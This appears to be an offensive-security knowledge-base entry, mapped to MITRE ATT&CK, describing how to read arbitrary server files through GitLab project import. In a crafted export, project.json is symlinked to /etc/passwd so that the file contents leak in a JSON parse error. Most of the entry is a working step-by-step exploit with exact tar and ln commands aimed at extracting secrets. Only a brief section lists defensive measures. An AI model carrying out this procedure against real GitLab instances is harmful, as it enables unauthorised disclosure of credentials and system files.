---
tags:
  - symlink
  - full-file-read
type: procedure
tools:
  - '[[tools/GNU-Tar]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/list-directory-with-symlinks]]'
  - '[[commands/create-tar-gz-archive]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-25T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:24:08.367Z'
sub_techniques: []
id: 02e74e31-93db-4e88-8a69-a9067dd8c4ff
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Modify-Export-with-Symlink-for-Full-Read

## Summary

This procedure alters a GitLab export by symlinking project.json to a sensitive file, allowing full content extraction during JSON parsing on import.

## Description

Extract the export, symlink project.json to /etc/passwd while keeping VERSION intact, and re-tar. On import, ProjectTreeRestorer's IO.read dereferences the symlink, and ActiveSupport::JSON.decode fails, exposing the full invalid JSON (file content) in the parse error. Prerequisites: Legitimate export and extraction tools. Outcomes: Complete file disclosure for secrets.

## Requirements

1. Untampered legitimate export
2. Linux shell with symlink and tar capabilities
3. Knowledge of target sensitive file

## Defense

Defensive measures and detection strategies:

- Extract archives in a chroot or with symlink restrictions
- Validate JSON files before parsing
- Monitor for JSON decode exceptions with large payloads

## Objectives

1. Insert project.json symlink for full read
2. Maintain archive integrity for import
3. Enable secrets extraction

## Instructions

### Step 1: Extract and Prepare

**Context**: Unpack and remove original project.json.

`tar -xzf export.tar.gz; rm project.json`

### Step 2: Create Symlink

**Context**: Link to target file.

`ln -s /etc/passwd project.json`

### Step 3: Verify

**Context**: Check structure.

Use [[commands/list-directory-with-symlinks]]:

```bash
ls -lash
```

> Expected output: Symlink listing for project.json.

### Step 4: Re-Package

**Context**: Create upload-ready archive.

Use [[commands/create-tar-gz-archive]]:

```bash
tar -czvf test.tar.gz .
```

> Expected output: New tar.gz with modification.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques


## Commands Used

- [[commands/list-directory-with-symlinks]]
- [[commands/create-tar-gz-archive]]

## Tools Used

- [[tools/GNU-Tar]]

## Tags

- [[symlink]]
- [[full-file-read]]
